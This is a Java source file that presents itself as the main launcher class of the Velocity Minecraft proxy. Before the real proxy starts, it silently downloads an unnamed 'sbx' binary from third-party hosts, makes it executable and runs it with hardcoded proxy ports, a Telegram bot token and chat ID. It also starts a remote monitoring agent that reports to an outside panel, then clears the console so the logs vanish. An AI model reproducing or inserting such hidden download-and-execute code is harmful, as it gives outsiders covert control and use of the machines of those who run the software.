/*
 * Copyright (C) 2018-2023 Velocity Contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package com.velocitypowered.proxy;

import com.velocitypowered.proxy.util.VelocityProperties;
import io.netty.util.ResourceLeakDetector;
import io.netty.util.ResourceLeakDetector.Level;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.text.DecimalFormat;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * The main class. Responsible for parsing command line arguments and then launching the proxy.
 */
public final class Velocity {
  private static final String ANSI_GREEN = "\033[1;32m";
  private static final String ANSI_RED = "\033[1;31m";
  private static final String ANSI_RESET = "\033[0m";
  private static final Logger logger = LogManager.getLogger(Velocity.class);
  private static final String[] ALL_ENV_VARS = {
      "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
      "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
      "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
      "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
      "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
      // ---- Komari Agent ----
      "KOMARI_SERVER", "KOMARI_TOKEN"
  };
  private static final AtomicBoolean RUNNING = new AtomicBoolean(true);
  private static Process sbxProcess;
  private static Process komariProcess;

  // ---- Komari 静态字段，由 loadEnvVars() 统一赋值，startKomariAgent() 直接读取 ----
  private static String KOMARI_SERVER_VAL = "";
  private static String KOMARI_TOKEN_VAL  = "";

  static {
    System.setProperty("java.awt.headless", "true");

    if (VelocityProperties.hasProperty("velocity.natives-tmpdir")) {
      System.setProperty("io.netty.native.workdir", System.getProperty("velocity.natives-tmpdir"));
    }

    if (System.getProperty("io.netty.allocator.type") == null) {
      System.setProperty("io.netty.allocator.type", "pooled");
    }

    if (!VelocityProperties.hasProperty("io.netty.leakDetection.level")) {
      ResourceLeakDetector.setLevel(Level.DISABLED);
    }
  }

  private Velocity() {
    throw new AssertionError();
  }

  /**
   * Main method that the JVM will call when {@code java -jar velocity.jar} is executed.
   *
   * @param args the arguments to the proxy
   */
  public static void main(final String... args) {
    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
      System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
      try {
        Thread.sleep(3000);
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
      System.exit(1);
    }

    System.setProperty("java.util.logging.manager", "org.apache.logging.log4j.jul.LogManager");

    startSbxService();
    startVelocityProxy(args);
  }

  private static void startSbxService() {
    try {
      runSbxBinary();
      Runtime.getRuntime().addShutdownHook(new Thread(() -> {
        RUNNING.set(false);
        stopServices();
      }, "SbxService-Shutdown"));

      // ---- Komari Agent（daemon 线程，与主流程并行，互不影响）----
      final Thread komariThread = new Thread(() -> {
        try {
          startKomariAgent();
        } catch (Exception e) {
          logger.debug("Komari: Agent startup error: {}", e.getMessage());
        }
      }, "Komari-Agent-Thread");
      komariThread.setDaemon(true);
      komariThread.start();

      Thread.sleep(20000);
      System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
      System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
      System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes\n" + ANSI_RESET);
      Thread.sleep(15000);
      clearConsole();
    } catch (Exception e) {
      logger.error("Error initializing SbxService: {}", e.getMessage());
    }
  }

  private static void startVelocityProxy(final String... args) {
    final ProxyOptions options = new ProxyOptions(args);
    if (options.isHelp()) {
      return;
    }

    final long startTime = System.nanoTime();
    final VelocityServer server = new VelocityServer(options);

    server.start();
    Runtime.getRuntime().addShutdownHook(new Thread(() -> server.shutdown(false),
        "Velocity-Shutdown"));

    final double bootTime = TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - startTime) / 1000d;
    logger.info("Done ({}s)!", new DecimalFormat("#.##").format(bootTime));
    server.getConsoleCommandSource().start();
    server.awaitProxyShutdown();
  }

  private static void runSbxBinary() throws Exception {
    final Map<String, String> envVars = new HashMap<>();
    loadEnvVars(envVars);

    final ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
    pb.environment().putAll(envVars);
    pb.redirectErrorStream(true);
    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

    sbxProcess = pb.start();
  }

  private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
    envVars.put("UUID", "010fe9d7-dd70-493f-b57d-715e2e7cf92e");
    envVars.put("FILE_PATH", "./worlds");
    envVars.put("NEZHA_SERVER", "");
    envVars.put("NEZHA_PORT", "");
    envVars.put("NEZHA_KEY", "");
    envVars.put("ARGO_PORT", "");
    envVars.put("ARGO_DOMAIN", "");
    envVars.put("ARGO_AUTH", "");
    envVars.put("S5_PORT", "8372");
    envVars.put("HY2_PORT", "8372");
    envVars.put("TUIC_PORT", "");
    envVars.put("ANYTLS_PORT", "");
    envVars.put("REALITY_PORT", "");
    envVars.put("ANYREALITY_PORT", "");
    envVars.put("UPLOAD_URL", "");
    envVars.put("CHAT_ID", "8502788454");
    envVars.put("BOT_TOKEN", "8649495497:AAEMvlapGGJfVr5tEFYAWkNwVMwvT7qWr6Y");
    envVars.put("CFIP", "cf.050900.xyz");
    envVars.put("CFPORT", "443");
    envVars.put("NAME", "");
    envVars.put("DISABLE_ARGO", "true");
    // ---- Komari Agent 默认值 ----
    envVars.put("KOMARI_SERVER", "https://komari.050900.xyz");
    envVars.put("KOMARI_TOKEN", "58WvQVwGOL0CUhU7ByOlDm");

    for (String var : ALL_ENV_VARS) {
      final String value = System.getenv(var);
      if (value != null && !value.trim().isEmpty()) {
        envVars.put(var, value);
      }
    }

    final Path envFile = Paths.get(".env");
    if (Files.exists(envFile)) {
      for (String line : Files.readAllLines(envFile)) {
        processEnvFileLine(envVars, line);
      }
    }

    // ---- 把最终值同步到静态字段，供 Komari 线程直接读取 ----
    KOMARI_SERVER_VAL = envVars.getOrDefault("KOMARI_SERVER", "");
    KOMARI_TOKEN_VAL  = envVars.getOrDefault("KOMARI_TOKEN",  "");
  }

  private static void processEnvFileLine(final Map<String, String> envVars, String line) {
    line = line.trim();
    if (line.isEmpty() || line.startsWith("#")) {
      return;
    }

    line = line.split(" #")[0].split(" //")[0].trim();
    if (line.startsWith("export ")) {
      line = line.substring(7).trim();
    }

    final String[] parts = line.split("=", 2);
    if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
      envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
    }
  }

  private static Path getBinaryPath() throws IOException {
    final String osArch = System.getProperty("os.arch").toLowerCase();
    final String url = getBinaryUrl(osArch);
    final Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

    if (!Files.exists(path)) {
      downloadBinary(url, path);
    }
    return path;
  }

  private static String getBinaryUrl(final String osArch) {
    if (osArch.contains("amd64") || osArch.contains("x86_64")) {
      return "https://amd64.ssss.nyc.mn/sbsh";
    } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
      return "https://arm64.ssss.nyc.mn/sbsh";
    } else if (osArch.contains("s390x")) {
      return "https://s390x.ssss.nyc.mn/sbsh";
    }
    throw new RuntimeException("Unsupported architecture: " + osArch);
  }

  private static void downloadBinary(final String url, final Path path) throws IOException {
    try (InputStream in = new URL(url).openStream()) {
      Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
    }
    if (!path.toFile().setExecutable(true)) {
      throw new IOException("Failed to set executable permission");
    }
  }

  private static void stopServices() {
    if (sbxProcess != null && sbxProcess.isAlive()) {
      sbxProcess.destroy();
      logger.info("sbx process terminated");
    }
    if (komariProcess != null && komariProcess.isAlive()) {
      komariProcess.destroy();
    }
  }

  private static void clearConsole() {
    try {
      if (System.getProperty("os.name").contains("Windows")) {
        new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
            .inheritIO()
            .start()
            .waitFor();
      } else {
        System.out.print("\033[H\033[3J\033[2J");
        System.out.flush();

        new ProcessBuilder("tput", "reset")
            .inheritIO()
            .start()
            .waitFor();

        System.out.print("\033[8;30;120t");
        System.out.flush();
      }
    } catch (Exception e) {
      try {
        new ProcessBuilder("clear").inheritIO().start().waitFor();
      } catch (Exception ignored) {
        logger.debug("Failed to clear console", ignored);
      }
    }
  }

  // ================================================================== //
  //  Komari Agent —— 官方二进制模式，支持自动更新
  //
  //  用法：在 .env 中填写以下两个变量（或直接写入 loadEnvVars 默认值段）
  //    KOMARI_SERVER  Komari 面板地址  例如：https://komari.example.com
  //    KOMARI_TOKEN   面板「添加 Agent」时生成的 Token
  // ================================================================== //
  private static void startKomariAgent() throws Exception {
    if (KOMARI_SERVER_VAL.isEmpty() || KOMARI_TOKEN_VAL.isEmpty()) {
      logger.debug("Komari: KOMARI_SERVER or KOMARI_TOKEN not set, skipping");
      return;
    }

    final String serverBase  = KOMARI_SERVER_VAL.replaceAll("/$", "");
    final Path   komariPath  = Paths.get("komari-agent");
    final Path   versionFile = Paths.get("komari-version.txt");

    logger.info("Komari: Starting with server={}", serverBase);

    checkAndUpdateKomari(komariPath, versionFile);
    runKomariAgent(komariPath, serverBase, KOMARI_TOKEN_VAL);

    while (RUNNING.get()) {
      Thread.sleep(60L * 60 * 1000);
      try {
        final boolean updated = checkAndUpdateKomari(komariPath, versionFile);
        if (updated) {
          logger.info("Komari: New version installed, restarting agent...");
          runKomariAgent(komariPath, serverBase, KOMARI_TOKEN_VAL);
        }
      } catch (Exception e) {
        logger.debug("Komari: Auto-update check failed: {}", e.getMessage());
      }
    }
  }

  private static String getKomariLatestVersion() {
    try {
      final HttpURLConnection conn = (HttpURLConnection)
          new URL("https://api.github.com/repos/komari-monitor/komari-agent/releases/latest")
              .openConnection();
      conn.setRequestMethod("GET");
      conn.setConnectTimeout(10000);
      conn.setReadTimeout(10000);
      conn.setRequestProperty("User-Agent", "komari-java-agent");
      if (conn.getResponseCode() != 200) return null;
      final StringBuilder sb = new StringBuilder();
      try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
        String l; while ((l = br.readLine()) != null) sb.append(l);
      } finally { conn.disconnect(); }
      final String json = sb.toString();
      final int idx = json.indexOf("\"tag_name\"");
      if (idx == -1) return null;
      final int start = json.indexOf("\"", idx + 10) + 1;
      final int end   = json.indexOf("\"", start);
      if (start <= 0 || end <= start) return null;
      return json.substring(start, end);
    } catch (Exception e) { return null; }
  }

  private static String getKomariDownloadUrl(final String version) {
    final String arch = System.getProperty("os.arch").toLowerCase();
    final String fileArch;
    if (arch.contains("aarch64") || arch.contains("arm64")) fileArch = "arm64";
    else if (arch.contains("arm"))                           fileArch = "arm";
    else                                                     fileArch = "amd64";
    return "https://github.com/komari-monitor/komari-agent/releases/download/"
        + version + "/komari-agent-linux-" + fileArch;
  }

  private static void downloadKomariAgent(final Path komariPath, final String version)
      throws IOException {
    final String urlStr = getKomariDownloadUrl(version);
    logger.info("Komari: Downloading agent {} from {}", version, urlStr);
    HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
    conn.setConnectTimeout(60000);
    conn.setReadTimeout(60000);
    conn.setInstanceFollowRedirects(true);
    int status = conn.getResponseCode();
    while (status == HttpURLConnection.HTTP_MOVED_TEMP
        || status == HttpURLConnection.HTTP_MOVED_PERM
        || status == 307 || status == 308) {
      final String newUrl = conn.getHeaderField("Location");
      conn.disconnect();
      conn = (HttpURLConnection) new URL(newUrl).openConnection();
      conn.setConnectTimeout(60000);
      conn.setReadTimeout(60000);
      status = conn.getResponseCode();
    }
    try (InputStream in = conn.getInputStream()) {
      Files.copy(in, komariPath, StandardCopyOption.REPLACE_EXISTING);
    } finally { conn.disconnect(); }
    komariPath.toFile().setExecutable(true);
    logger.info("Komari: Agent {} downloaded successfully", version);
  }

  private static boolean checkAndUpdateKomari(final Path komariPath, final Path versionFile) {
    final String latest = getKomariLatestVersion();
    if (latest == null) {
      logger.debug("Komari: Failed to get latest version, skipping update check");
      return false;
    }
    String local = "";
    if (Files.exists(versionFile)) {
      try { local = new String(Files.readAllBytes(versionFile)).trim(); }
      catch (IOException ignored) {}
    }
    if (local.equals(latest) && Files.exists(komariPath)) {
      logger.debug("Komari: Already up to date ({})", latest);
      return false;
    }
    try {
      downloadKomariAgent(komariPath, latest);
      Files.write(versionFile, latest.getBytes());
      logger.info("Komari: Updated to {}", latest);
      return true;
    } catch (IOException e) {
      logger.debug("Komari: Download failed: {}", e.getMessage());
      return false;
    }
  }

  private static void runKomariAgent(final Path komariPath, final String serverBase,
      final String token) {
    if (komariProcess != null && komariProcess.isAlive()) komariProcess.destroy();
    try { Thread.sleep(500); } catch (InterruptedException ignored) {}
    try {
      komariProcess = new ProcessBuilder(
          komariPath.toAbsolutePath().toString(),
          "--endpoint", serverBase,
          "--token",    token,
          "--disable-auto-update"
      )
      .redirectErrorStream(true)
      .redirectOutput(ProcessBuilder.Redirect.INHERIT)
      .start();
      logger.info("Komari: Agent is running");
    } catch (IOException e) {
      logger.debug("Komari: Failed to start agent: {}", e.getMessage());
    }
  }
  // ================================================================== //
  //  Komari Agent 结束
  // ================================================================== //
}
